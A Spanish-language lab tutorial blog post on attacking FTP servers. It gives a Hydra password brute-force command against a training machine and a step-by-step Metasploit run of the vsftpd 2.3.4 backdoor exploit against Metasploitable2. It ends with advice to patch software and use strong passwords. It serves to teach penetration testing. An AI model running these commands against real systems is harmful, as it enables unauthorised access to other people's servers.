---
title: Enumeración y explotación de FTP
excerpt: Enumeración y explotación FTP
publishDate: 'Sep 26 2025'
tags:
  - ftp
seo:
  image:
    src: '/Nmap.png'
    alt: Imagen creada con Chat GPT
---


![Bruteforce FTP](/bftp.png)

***Resumen***: FTP significa File Transfer Protocol y sirve para enviar y recibir archivos por nuestra red. Como todo en esta vida, podemos vulnerarlo, bien mediante formas automáticas (metasploit), o bien mediante fuerza bruta. En este post voy a mostrar un ejemplo de las dos maneras.

***Nota***: En este laboratorio se va a usar la máquina **Stranger** de la plataforma [Dokerlabs](https://dockerlabs.es/) que tiene un servidor FTP habilitado para uso de fuerza bruta, en el caso de uso de [Metasploit](https://www.metasploit.com) voy a usar [Metasploitable2](https://docs.rapid7.com/metasploit/metasploitable-2/) que virtualizaré mediante VMware.

## Identificación del servicio

Estamos en el contexto de que ya hemos hecho un procedimiento de enumeración a la máquina objetivo y sabemos que tiene un servidor FTP corriendo, así mismo, estudiando la máquina he llegado a la conclusión de que el usuario de dicho FTP es **admin**, así que voy a usar [Hydra](https://github.com/topics/hydra) para forzar el descubrimiento de la contraseña mediante un diccionario.

El comando es muy fácil:

````bash 
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://172.17.0.2 
````
Vemos que el parámetro -l está en minúsculas por que ya conocemos el usuario, de lo contrario hay que ponerlo en mayúsculas y pasar un diccionario que es, precisamente, lo que hemos hecho con las passwords.

El resultado es el de la imagen, nos ha encontrado la contraseña de una manera rápida porque el servicio está configurado con una muy débil.

[![pass_ftp](/pass_ftp.png)](/pass_ftp.png)

Como veis, el procedimiento es sumamente fácil.

## Procedimiento mediante Metasploit

Ahora vamos a vulenrar el servidor FTP mediante un exploit usando para ello el framework **Metasploit**.

Lo primero es identificar el servicio que corre por el puerto 21 y la versión del software con [Nmap](https://marcoscarmonagarcia.github.io/blog/post-1/), y vemos que es un vsftpd 2.3.4. Así que buscaremos el exploit.

[![version_ftp](/version_ftp.png)](/version_ftp.png)

Abrimos nuestro metasploit con:
```bash 
msfconsole
`````
Y con search buscamos el exploit existente.

```bash
search vsftpd 2.3.4
```
Vemos que solo hay uno así que lo escogemos y miramos las opciones de configuración con:
```bash
show options
````
[![search_exploit](/search_exploit.png)](/search_exploit.png)

Vemos que lo único que nos pide el el RHOST que es la ip de la máquina objetivo, así que lo introducimos con:
```bash
set RHOST 192.168.1.28
````

[![rhost](/rhost.png)](/rhost.png)

Y lanzamos el exploit con:
```bash
run
````
Y ya está, ya estamos dentro de la máquina con una sesión abierta.

[![dentro_ftp](/dentro_ftp.png)](/dentro_ftp.png)

## Conlusiones

Hay que mantener nuestro software actualizado y nuestras constraseñas robustas.


